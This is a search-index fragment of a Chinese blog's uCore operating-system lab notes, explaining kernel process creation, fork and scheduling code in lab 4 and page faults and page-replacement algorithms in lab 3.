","date":"2021-12-13","objectID":"/ucore-lab-4/:3:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程创建-1"},{"categories":["Pwning"],"content":"空闲进程的创建空闲进程idle主要工作是完成内核中各个子系统的初始化，并最后用于调度其他进程。该进程最终会一直在cpu_idle函数中判断当前是否可调度。 由于该进程是为了调度进程而创建的，所以其need_resched成员初始时为1。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#空闲进程的创建"},{"categories":["Pwning"],"content":"第一个内核线程的创建第一个内核进程是未来所有新进程的父进程或祖先进程。 initproc：在proc_init()创建 初始化trapframe：kernel_thread –\u003e do_fork –\u003e copy_thread() 初始化initproc：初始化它的PCB，alloc_proc 初始化内核堆栈：setup_stack() 内存共享：copy_stack()与其他内核线程共享内核地址空间 把initproc放到就绪队列 唤醒 ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#第一个内核线程的创建"},{"categories":["Pwning"],"content":"进程终止","date":"2021-12-13","objectID":"/ucore-lab-4/:4:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程终止"},{"categories":["Pwning"],"content":"waitwait系统调用用于父进程等待子进程的结束 子进程结束时，通过exit()向父进程返回一个值 父进程通过wait接收并处理返回值 wait函数调用的功能 有子进程存活时，父进程进入等待状态，等待子进程返回结果 当某子进程调用 exit()时，唤醒父进程，将exit()的返回值作为父进程中wait的返回值 有僵尸子进程等待时，wait()立即返回其中一个值 无子进程存活时，wait()立即返回 ","date":"2021-12-13","objectID":"/ucore-lab-4/:4:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#wait"},{"categories":["Pwning"],"content":"exit进程结束时调用exit()，完成进程资源回收。 exit函数调用的功能 将调用参数作为进程的“结果” 关闭所有打开的文件等占用资源。 释放内存 释放大部分进程相关的内核数据结构 检查父进程是否存活 如果存活，则保留结果的值，直到父进程使用。同时当前进程进入僵尸(zombie)状态。 如果没有，它将释放所有的数据结构，进程结束。 清理所有等待的僵尸进程。 进程终止是最终的垃圾收集（资源回收）。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:4:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#exit"},{"categories":["Pwning"],"content":"uCore进程的初始化 // proc_init - set up the first kernel thread idleproc \"idle\" by itself and // - create the second kernel thread init_main void proc_init(void) { int i; list_init(\u0026proc_list); for (i = 0; i \u003c HASH_LIST_SIZE; i ++) { list_init(hash_list + i); } if ((idleproc = alloc_proc()) == NULL) { panic(\"cannot alloc idleproc.\\n\"); } idleproc-\u003epid = 0; idleproc-\u003estate = PROC_RUNNABLE; idleproc-\u003ekstack = (uintptr_t)bootstack; idleproc-\u003eneed_resched = 1; set_proc_name(idleproc, \"idle\"); nr_process ++; current = idleproc; int pid = kernel_thread(init_main, \"Hello world!!\", 0); if (pid \u003c= 0) { panic(\"create init_main failed.\\n\"); } initproc = find_proc(pid); set_proc_name(initproc, \"init\"); assert(idleproc != NULL \u0026\u0026 idleproc-\u003epid == 0); assert(initproc != NULL \u0026\u0026 initproc-\u003epid == 1); } 首先初始化了进程相关的链表，然后通过alloc_proc手动构造了进程idle并设置其中的参数值。 接着创建了内核线程initproc，使其执行init_main。 主要函数是kernel_thread int kernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags) { struct trapframe tf; memset(\u0026tf, 0, sizeof(struct trapframe)); tf.tf_cs = KERNEL_CS; tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS; tf.tf_regs.reg_ebx = (uint32_t)fn; tf.tf_regs.reg_edx = (uint32_t)arg; tf.tf_eip = (uint32_t)kernel_thread_entry; return do_fork(clone_flags | CLONE_VM, 0, \u0026tf); } 首先设置了trapframe的必要字段，之后使用do_fork做真正的创建。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ucore进程的初始化"},{"categories":["Pwning"],"content":"练习1分配并初始化一个进程控制块 // alloc_proc - alloc a proc_struct and init all fields of proc_struct static struct proc_struct * alloc_proc(void) { struct proc_struct *proc = kmalloc(sizeof(struct proc_struct)); if (proc != NULL) { proc-\u003estate = PROC_UNINIT; proc-\u003epid = -1; proc-\u003ekstack = 0; proc-\u003eneed_resched = 0; proc-\u003eparent = NULL; proc-\u003emm = NULL; memset(\u0026proc-\u003econtext, 0, sizeof(struct context)); proc-\u003etf = NULL; proc-\u003ecr3 = boot_cr3; proc-\u003eflags = 0; memset(proc-\u003ename, 0, sizeof(proc-\u003ename)); } return proc; } 请说明proc_struct中struct context context和struct trapframe *tf成员变量含义和在本实验中的作用是啥？ 可以注意到，在进程在我们的内核出现之前，仅有trapframe的存在。trapframe在中断处理时，保存到切换后的栈中，用于在从内核态返回到用户态的进程上下文保存。 而在内核中断中没有这种结构，只有线程/进程的切换。这时候就要使用到context结构了。在context结构中，只有寄存器的保存，没有段寄存器。因为进程之间切换不涉及特权级的变化。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#练习1"},{"categories":["Pwning"],"content":"练习2为新创建的内核线程分配资源 /* do_fork - parent process for a new child process * @clone_flags: used to guide how to clone the child process * @stack: the parent's user stack pointer. if stack==0, It means to fork a kernel thread. * @tf: the trapframe info, which will be copied to child process's proc-\u003etf */ int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf) { int ret = -E_NO_FREE_PROC; struct proc_struct *proc; if (nr_process \u003e= MAX_PROCESS) { goto fork_out; } ret = -E_NO_MEM; proc = alloc_proc(); if(proc == NULL) { cprintf(\"alloc_proc faile in do_fork\"); goto bad_fork_cleanup_proc; } if((ret = setup_kstack(proc)) != 0) { cprintf(\"setup_kstack faile in do_fork\"); goto bad_fork_cleanup_proc; } if((ret = copy_mm(clone_flags, proc)) != 0) { cprintf(\"copy_mm faile in do_fork\"); goto bad_fork_cleanup_kstack; } copy_thread(proc, stack, tf); bool intr_flag; local_intr_save(intr_flag); { proc-\u003epid = get_pid(); hash_proc(proc); list_add(proc_list.prev, \u0026proc-\u003elist_link); nr_process++; } local_intr_restore(intr_flag); wakeup_proc(proc); ret = proc-\u003epid; fork_out: return ret; bad_fork_cleanup_kstack: put_kstack(proc); bad_fork_cleanup_proc: kfree(proc); goto fork_out; } 在fork中，为进程申请PCB，设置堆栈，还要将其加入到相关链表中。注意进程相关的一些链表是全局变量！这意味着，多个内核线程都可以访问或修改，所以为了避免条件竞争，我们在进行对应的操作时要屏蔽中断。 请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。 // get_pid - alloc a unique pid for process static int get_pid(void) { static_assert(MAX_PID \u003e MAX_PROCESS); struct proc_struct *proc; list_entry_t *list = \u0026proc_list, *le; static int next_safe = MAX_PID, last_pid = MAX_PID; if (++ last_pid \u003e= MAX_PID) { last_pid = 1; goto inside; } if (last_pid \u003e= next_safe) { inside: next_safe = MAX_PID; repeat: le = list; while ((le = list_next(le)) != list) { proc = le2proc(le, list_link); if (proc-\u003epid == last_pid) { if (++ last_pid \u003e= next_safe) { if (last_pid \u003e= MAX_PID) { last_pid = 1; } next_safe = MAX_PID; goto repeat; } } else if (proc-\u003epid \u003e last_pid \u0026\u0026 next_safe \u003e proc-\u003epid) { next_safe = proc-\u003epid; } } } return last_pid; } 系统第一次调用get_pid时，next_safe == last_pid == MAX_PID，当last_pid自增后大于等于MAX_PID，则当前可能是第一次调用，所以先设置last_pid为1。pid为0的进程是我们手动创建的。接着遍历进程链表，如果这是第一此调用，循环跳出后，last_pid = 1 ~ next_safe = MAX_PID，则下一次只需要在这个范围寻找即可。如果last_pid小于MAX_PID和next_safe那么就可以直接返回。 如果超过了next_safe，则需要遍历进程列表，若当前进程列表中有PID等于last_pid的进程，则要重新设置last_pid的值。还要判断是否超过了next_safe。 总之就是在函数中维护了last_pid ~ next_safe的区间减少搜索范围。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#练习2"},{"categories":["Pwning"],"content":"fork的两次返回在copy_thread中 // copy_thread - setup the trapframe on the process's kernel stack top and // - setup the kernel entry point and stack of process static void copy_thread(struct proc_struct *proc, uintptr_t esp, struct trapframe *tf) { proc-\u003etf = (struct trapframe *)(proc-\u003ekstack + KSTACKSIZE) - 1; *(proc-\u003etf) = *tf; proc-\u003etf-\u003etf_regs.reg_eax = 0; proc-\u003etf-\u003etf_esp = esp; proc-\u003etf-\u003etf_eflags |= FL_IF; proc-\u003econtext.eip = (uintptr_t)forkret; proc-\u003econtext.esp = (uintptr_t)(proc-\u003etf); } 可以看到新线程的eip被设置为forkret // forkret -- the first kernel entry point of a new thread/process // NOTE: the addr of forkret is setted in copy_thread function // after switch_to, the current proc will execute here. static void forkret(void) { forkrets(current-\u003etf); } forkrets以当前进程的tf为参数执行一下代码： # return falls through to trapret... .globl __trapret __trapret: # restore registers from stack popal # restore %ds, %es, %fs and %gs popl %gs popl %fs popl %es popl %ds # get rid of the trap number and error code addl $0x8, %esp iret .globl forkrets forkrets: # set stack to this new process's trapframe movl 4(%esp), %esp jmp __trapret 从tf恢复段寄存器和通用寄存器的值，并返回。而在copu_thread中将eax的值设置为了0。 所以，父进程的fork通过do_fork返回新创建进程的PID，而子进程跳转到forkrets通过current-\u003etf恢复寄存器的值，返回0。由此，实现了一次调用返回两个不同的值。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#fork的两次返回"},{"categories":["Pwning"],"content":"练习3理解 proc_run 函数和它调用的函数如何完成进程切换的 // proc_run - make process \"proc\" running on cpu // NOTE: before call switch_to, should load base addr of \"proc\"'s new PDT void proc_run(struct proc_struct *proc) { if (proc != current) { bool intr_flag; struct proc_struct *prev = current, *next = proc; local_intr_save(intr_flag); { current = proc; load_esp0(next-\u003ekstack + KSTACKSIZE); lcr3(next-\u003ecr3); switch_to(\u0026(prev-\u003econtext), \u0026(next-\u003econtext)); } local_intr_restore(intr_flag); } } 在swtich_to之前，设置current、esp和页表寄存器cr3。这个调度过程不能被打断。 使用根据进程PCB中的context保存之前进程的上下文，恢复下一个进程的上下文。 void schedule(void) { bool intr_flag; list_entry_t *le, *last; struct proc_struct *next = NULL; local_intr_save(intr_flag); { current-\u003eneed_resched = 0; last = (current == idleproc) ? \u0026proc_list : \u0026(current-\u003elist_link); le = last; do { if ((le = list_next(le)) != \u0026proc_list) { next = le2proc(le, list_link); if (next-\u003estate == PROC_RUNNABLE) { break; } } } while (le != last); if (next == NULL || next-\u003estate != PROC_RUNNABLE) { next = idleproc; } next-\u003eruns ++; if (next != current) { proc_run(next); } } local_intr_restore(intr_flag); } proc_run由schedule调用。它从进程链表中取出一个就绪态的进程调用proc_run。 在本实验的执行过程中，创建且运行了几个内核线程？ 两个内核线程，分别是idleproc和initproc。 idleproc负责进程调度 initproc是之后所有新进程的祖先 语句local_intr_save(intr_flag);....local_intr_restore(intr_flag);在这里有何作用?请说明理由。 这两句代码的作用分别是阻塞中断和解除中断的阻塞。 这两句的配合，使得这两句代码之间的代码块形成原子操作，可以使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争。 以进程切换为例，在proc_run中，当刚设置好current指针为下一个进程，但还未完全将控制权转移时，如果该过程突然被一个中断所打断，则中断处理例程的执行可能会引发异常，因为current指针指向的进程与实际使用的进程资源不一致。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#练习3"},{"categories":["Pwning"],"content":"通过lab2知识的讲解，我们已经对虚拟内存有了一个初步认识， 有了内存地址虚拟化，我们就可以通过设置页表项来限定软件运行时的访问空间，确保软件运行不越界，完成内存访问保护的功能。 通过内存地址虚拟化，可以使得软件在没有访问某虚拟内存地址时不分配具体的物理内存，而只有在实际访问某虚拟内存地址时，操作系统再动态地分配物理内存，建立虚拟内存到物理内存的页映射关系，这种技术称为按需分页（demand paging）。 把不经常访问的数据所占的内存空间临时写到硬盘上，这样可以腾出更多的空闲内存空间给经常访问的数据；当CPU访问到不经常访问的数据时，再把这些数据从硬盘读入到内存中，这种技术称为页换入换出（page　swap in/out）。这种内存管理技术给了程序员更大的内存“空间”，从而可以让更多的程序在内存中并发运行。 需要注意的是： 虚拟内存单元不一定有实际的物理内存单元对应，即实际的物理内存单元可能不存在； 如果虚拟内存单元对应有实际的物理内存单元，那二者的地址一般是不相等的； 通过操作系统实现的某种内存映射可建立虚拟内存与物理内存的对应关系，使得程序员或CPU访问的虚拟内存地址会自动转换为一个物理内存地址。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#"},{"categories":["Pwning"],"content":"Page fault产生页访问异常的原因主要有： 目标页帧不存在（页表项全为0，即该线性地址与物理地址尚未建立映射或者已经撤销)； 相应的物理页帧不在内存中（页表项非空，但Present标志位=0，比如在swap分区或磁盘文件上)，这在本次实验中会出现，我们将在下面介绍换页机制实现时进一步讲解如何处理； 不满足访问权限(此时页表项P标志=1，但低权限的程序试图访问高权限的地址空间，或者有程序试图写只读页面). 当出现上面情况之一，那么就会产生页面page fault（#PF）异常。CPU会把产生异常的线性地址存储在CR2中，并且把表示页访问异常类型的值（简称页访问异常错误码，errorCode）保存在中断栈中。 页访问异常错误码有32位。位0为１表示对应物理页不存在；位１为１表示写异常（比如写了只读页；位２为１表示访问权限异常（比如用户态程序访问内核空间的数据） CR2是页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。CR2用于发生页异常时报告出错信息。当发生页异常时，处理器把引起页异常的线性地址保存在CR2中。操作系统中对应的中断服务例程可以检查CR2的内容，从而查出线性地址空间中的哪个页引起本次异常。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#page-fault"},{"categories":["Pwning"],"content":"uCore的处理CPU在当前内核栈保存当前被打断的程序现场，即依次压入当前被打断程序使用的EFLAGS，CS，EIP，errorCode；由于页访问异常的中断号是0xE，CPU把异常中断号0xE对应的中断服务例程的地址（vectors.S中的标号vector14处）加载到CS和EIP寄存器中，开始执行中断服务例程。这时ucore开始处理异常中断，首先需要保存硬件没有保存的寄存器。在vectors.S中的标号vector14处先把中断号压入内核栈，然后再在trapentry.S中的标号__alltraps处把DS、ES和其他通用寄存器都压栈。自此，被打断的程序执行现场（context）被保存在内核栈中。接下来，在trap.c的trap函数开始了中断服务例程的处理流程，大致调用关系为： trap–\u003e trap_dispatch–\u003epgfault_handler–\u003edo_pgfault 下面需要具体分析一下do_pgfault函数。do_pgfault的调用关系如下图所示： 产生页访问异常后，CPU把引起页访问异常的线性地址装到寄存器CR2中，并给出了出错码errorCode，说明了页访问异常的类型。ucore OS会把这个值保存在struct trapframe 中tf_err成员变量中。而中断服务例程会调用页访问异常处理函数do_pgfault进行具体处理。这里的页访问异常处理是实现按需分页、页换入换出机制的关键之处。 ucore中do_pgfault函数是完成页访问异常处理的主要函数，它根据从CPU的控制寄存器CR2中获取的页访问异常的物理地址以及根据errorCode的错误类型来查找此地址是否在某个VMA的地址范围内以及是否满足正确的读写权限，如果在此范围内并且权限也正确，这认为这是一次合法访问，但没有建立虚实对应关系。所以需要分配一个空闲的内存页，并修改页表完成虚地址到物理地址的映射，刷新TLB，然后调用iret中断，返回到产生页访问异常的指令处重新执行此指令。如果该虚地址不在某VMA范围内，则认为是一次非法访问。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ucore的处理"},{"categories":["Pwning"],"content":"页替换","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#页替换"},{"categories":["Pwning"],"content":"局部页面置换算法 置换页面的选择范围仅限于当前进程占用的物理页面内. ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#局部页面置换算法"},{"categories":["Pwning"],"content":"最优页面置换算法最佳(Optimal, OPT)置换算法所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面,这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若千页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现。 可用作其他算法的评价的依据（在一个模拟器上运行某个程序，并记录每一次的页面的访问情况，在第二遍运行时间可使用最优算法） ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#最优页面置换算法"},{"categories":["Pwning"],"content":"最近最少用算法（LRU）简介 思路：选择最长时间没有被引用的页面进行置换。 实现：缺页时，计算内存中每个逻辑页面的上一个访问时间，并选择上一个使用到当前时间最长的页面。 特征：最优置换算法的一种近似。 b. 具体实现 页面链表 系统维护一个按最近一次访问时间排序的页面链表 链表首节点是最近刚刚使用过的页面 链表尾结点是最久未使用的页面 访问内存时，找到相应页面并将其移至链表之首 缺页时，置换链表尾结点的页面 活动页面栈 访问页面时，将此页号压入栈底。并将栈内相同的页号抽出 缺页时，置换栈底的页面。 上述的两种实现都需要维护以及遍历搜索某个数据结构， 同时LRU对于过去的访问情况统计过于细致，所以该方法较为复杂。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#最近最少用算法lru"},{"categories":["Pwning"],"content":"最近最少用算法（LRU）简介 思路：选择最长时间没有被引用的页面进行置换。 实现：缺页时，计算内存中每个逻辑页面的上一个访问时间，并选择上一个使用到当前时间最长的页面。 特征：最优置换算法的一种近似。 b. 具体实现 页面链表 系统维护一个按最近一次访问时间排序的页面链表 链表首节点是最近刚刚使用过的页面 链表尾结点是最久未使用的页面 访问内存时，找到相应页面并将其移至链表之首 缺页时，置换链表尾结点的页面 活动页面栈 访问页面时，将此页号压入栈底。并将栈内相同的页号抽出 缺页时，置换栈底的页面。 上述的两种实现都需要维护以及遍历搜索某个数据结构， 同时LRU对于过去的访问情况统计过于细致，所以该方法较为复杂。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#简介"},{"categories":["Pwning"],"content":"最近最少用算法（LRU）简介 思路：选择最长时间没有被引用的页面进行置换。 实现：缺页时，计算内存中每个逻辑页面的上一个访问时间，并选择上一个使用到当前时间最长的页面。 特征：最优置换算法的一种近似。 b. 具体实现 页面链表 系统维护一个按最近一次访问时间排序的页面链表 链表首节点是最近刚刚使用过的页面 链表尾结点是最久未使用的页面 访问内存时，找到相应页面并将其移至链表之首 缺页时，置换链表尾结点的页面 活动页面栈 访问页面时，将此页号压入栈底。并将栈内相同的页号抽出 缺页时，置换栈底的页面。 上述的两种实现都需要维护以及遍历搜索某个数据结构， 同时LRU对于过去的访问情况统计过于细致，所以该方法较为复杂。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#b-具体实现"},{"categories":["Pwning"],"content":"先进先出算法（FIFO） 基本思路：选择在内存中驻留时间最长的页面并淘汰之。 具体来说，系统维护着一个链表，记录了所有位于内存当中的逻辑页面。从链表的排列顺序来看，链首页面的驻留时间最长，链尾页面的驻留时间最短。当发生一个缺页中断时，把链表首页面淘汰出局，并把新的页面添加到链表的末尾。 性能较差，调出的页面有可能是经常要访问的页面，并且有Belady现象。FIFO算法很少单独使用。 实现：一个单一的指针就够了 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:3","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#先进先出算法fifo"},{"categories":["Pwning"],"content":"Belady现象 现象： 采用FIFO等算法时，可能出现分配的物理页面数增加，缺页次数反而升高的异常情况。 原因： FIFO算法的置换特征与进程访问内存的动态特征矛盾 被置换出去的页面并不一定是进程近期不会访问的。 LRU算法和FIFO本质上都是先进先出的思路，只不过LRU是针对页面的最近访问时间来进行排序，所以需要在每一次页面访问的时候动态的调整各个页面之间的先后顺序（有一个页面的最近访问时间变了）； 而FIFO是针对页面进入内存的时间来进行排序。这个时间是固定不变的，所以各页面之间的先后顺序是固定的。如果一个页面在进入内存之后没有被访问，那么它的最近访问时间就是它进入内存的时间。 换句话说，如果内存当中的所有页面都未曾访问过，那么LRU就退化为FIFO算法。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:4","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#belady现象"},{"categories":["Pwning"],"content":"改进的时钟页面置换算法（Clock）简介 思路： 仅对页面的访问情况进行大致统计 减小修改页的缺页处理开销 数据结构： 在页表项中增加访问位，描述页面在过去一段时间的内访问情况。 在页表项中增加修改位，以判断当前页面是否修改过但没有存入外存。 各页面组织成环形链表，同时指针指向最先调入的页面。 算法 访问页面时，在页表项记录页面访问情况 缺页时，从指针处开始顺序查找未被访问与未被修改的页面进行置换。 特征： 时钟算法是LRU与FIFO的折中。 具体实现 页面装入内存时，访问位初始化为0 访问页面（读/写）时，访问位置为1 缺页时，从指针当前位置顺序检查环形链表。 若当前遍历到的页面访问位为0，则置换该页 若当前遍历到的页面访问位为1，则设置该页的访问位为0，并移动指针到下一个页面，直到找到可置换的页面。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:5","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#改进的时钟页面置换算法clock"},{"categories":["Pwning"],"content":"改进的时钟页面置换算法（Clock）简介 思路： 仅对页面的访问情况进行大致统计 减小修改页的缺页处理开销 数据结构： 在页表项中增加访问位，描述页面在过去一段时间的内访问情况。 在页表项中增加修改位，以判断当前页面是否修改过但没有存入外存。 各页面组织成环形链表，同时指针指向最先调入的页面。 算法 访问页面时，在页表项记录页面访问情况 缺页时，从指针处开始顺序查找未被访问与未被修改的页面进行置换。 特征： 时钟算法是LRU与FIFO的折中。 具体实现 页面装入内存时，访问位初始化为0 访问页面（读/写）时，访问位置为1 缺页时，从指针当前位置顺序检查环形链表。 若当前遍历到的页面访问位为0，则置换该页 若当前遍历到的页面访问位为1，则设置该页的访问位为0，并移动指针到下一个页面，直到找到可置换的页面。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:5","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#简介-1"},{"categories":["Pwning"],"content":"改进的时钟页面置换算法（Clock）简介 思路： 仅对页面的访问情况进行大致统计 减小修改页的缺页处理开销 数据结构： 在页表项中增加访问位，描述页面在过去一段时间的内访问情况。 在页表项中增加修改位，以判断当前页面是否修改过但没有存入外存。 各页面组织成环形链表，同时指针指向最先调入的页面。 算法 访问页面时，在页表项记录页面访问情况 缺页时，从指针处开始顺序查找未被访问与未被修改的页面进行置换。 特征： 时钟算法是LRU与FIFO的折中。 具体实现 页面装入内存时，访问位初始化为0 访问页面（读/写）时，访问位置为1 缺页时，从指针当前位置顺序检查环形链表。 若当前遍历到的页面访问位为0，则置换该页 若当前遍历到的页面访问位为1，则设置该页的访问位为0，并移动指针到下一个页面，直到找到可置换的页面。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:5","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#具体实现"},{"categories":["Pwning"],"content":"全局置换算法 思路：全局置换算法为进程分配可变数目的物理页面。 要解决的问题： 进程在不同阶段的内存需求是有变化的。 分配给进程的内存也需要在不同阶段有所变化。 全局置换算法需要确定分配给进程的物理页面数。 CPU利用率与并发进程数存在相互制约的关系。 进程数少时，提高并发进程数，可提高CPU利用效率。 并发进程导致内存访问增加 并发进程的内存访问会降低了访存的局部性特征。 局部性特征的下降会导致缺页率上升和CPU利用率下降。 全局页面置换算法置换内存中所有可换出的物理页面，即换进内存的是进程A的页面，换出内存的可能是进程B的页面，所以进程在内存中占用的页面总数是可变的。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#全局置换算法"},{"categories":["Pwning"],"content":"工作集置换算法工作集与常驻集 工作集 是一个进程当前正在使用的逻辑页面集合，可表示为二元函数W(t,Δ)W(t,Δ) tt是当前的执行时刻 Δ 称为工作集窗口(working-set window)，即一个定长的页面访问时间的窗口。 W(t,Δ)W(t,Δ)指在当前时刻tt前的Δ时间窗口中的所有访问页面所组成的集合。 |W(t,Δ)||W(t,Δ)|指工作集的大小，即页面数目。 常驻集是当前时刻进程实际驻留在内存中的页面集合。 工作集与常驻集的关系 工作集是进程在运行过程中固有的性质 常驻集取决于系统分配给进程的物理页面数目和页面置换算法。 思路 当前时刻前ττ个内存访问的页引用是工作集。其中ττ被称为窗口大小。 换出不在工作集中的页面 具体实现 访存链表：维护窗口内的访存页面 访存时，换出不在工作集的页面； 更新访存链表。 缺页时，换入页面，更新访存链表。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#工作集置换算法"},{"categories":["Pwning"],"content":"工作集置换算法工作集与常驻集 工作集 是一个进程当前正在使用的逻辑页面集合，可表示为二元函数W(t,Δ)W(t,Δ) tt是当前的执行时刻 Δ 称为工作集窗口(working-set window)，即一个定长的页面访问时间的窗口。 W(t,Δ)W(t,Δ)指在当前时刻tt前的Δ时间窗口中的所有访问页面所组成的集合。 |W(t,Δ)||W(t,Δ)|指工作集的大小，即页面数目。 常驻集是当前时刻进程实际驻留在内存中的页面集合。 工作集与常驻集的关系 工作集是进程在运行过程中固有的性质 常驻集取决于系统分配给进程的物理页面数目和页面置换算法。 思路 当前时刻前ττ个内存访问的页引用是工作集。其中ττ被称为窗口大小。 换出不在工作集中的页面 具体实现 访存链表：维护窗口内的访存页面 访存时，换出不在工作集的页面； 更新访存链表。 缺页时，换入页面，更新访存链表。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#工作集与常驻集"},{"categories":["Pwning"],"content":"工作集置换算法工作集与常驻集 工作集 是一个进程当前正在使用的逻辑页面集合，可表示为二元函数W(t,Δ)W(t,Δ) tt是当前的执行时刻 Δ 称为工作集窗口(working-set window)，即一个定长的页面访问时间的窗口。 W(t,Δ)W(t,Δ)指在当前时刻tt前的Δ时间窗口中的所有访问页面所组成的集合。 |W(t,Δ)||W(t,Δ)|指工作集的大小，即页面数目。 常驻集是当前时刻进程实际驻留在内存中的页面集合。 工作集与常驻集的关系 工作集是进程在运行过程中固有的性质 常驻集取决于系统分配给进程的物理页面数目和页面置换算法。 思路 当前时刻前ττ个内存访问的页引用是工作集。其中ττ被称为窗口大小。 换出不在工作集中的页面 具体实现 访存链表：维护窗口内的访存页面 访存时，换出不在工作集的页面； 更新访存链表。 缺页时，换入页面，更新访存链表。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#思路"},{"categories":["Pwning"],"content":"工作集置换算法工作集与常驻集 工作集 是一个进程当前正在使用的逻辑页面集合，可表示为二元函数W(t,Δ)W(t,Δ) tt是当前的执行时刻 Δ 称为工作集窗口(working-set window)，即一个定长的页面访问时间的窗口。 W(t,Δ)W(t,Δ)指在当前时刻tt前的Δ时间窗口中的所有访问页面所组成的集合。 |W(t,Δ)||W(t,Δ)|指工作集的大小，即页面数目。 常驻集是当前时刻进程实际驻留在内存中的页面集合。 工作集与常驻集的关系 工作集是进程在运行过程中固有的性质 常驻集取决于系统分配给进程的物理页面数目和页面置换算法。 思路 当前时刻前ττ个内存访问的页引用是工作集。其中ττ被称为窗口大小。 换出不在工作集中的页面 具体实现 访存链表：维护窗口内的访存页面 访存时，换出不在工作集的页面； 更新访存链表。 缺页时，换入页面，更新访存链表。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#具体实现-1"},{"categories":["Pwning"],"content":"缺页率置换算法（PPF）简介通过调节常驻集大小，使每个进程的缺页率保持在一个合理的范围内。 若进程缺页率过高，则增加常驻集以分配更多的物理内存 若进程缺页率过低，则减小常驻集以减小它的物理页面数。 具体实现 访存时，设置引用位标志 缺页时，计算从上次缺页时间$t_{last}$到现在$t_{current}$的时间间隔 如果$t_{current}−t_{last}\u003eT$，则置换所有在$[t_{last},t_{current}]$时间内没有被引用的页。 如果$t_{current}−t_{last}\u003cT$，则增加缺失页到常驻集中。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#缺页率置换算法ppf"},{"categories":["Pwning"],"content":"缺页率置换算法（PPF）简介通过调节常驻集大小，使每个进程的缺页率保持在一个合理的范围内。 若进程缺页率过高，则增加常驻集以分配更多的物理内存 若进程缺页率过低，则减小常驻集以减小它的物理页面数。 具体实现 访存时，设置引用位标志 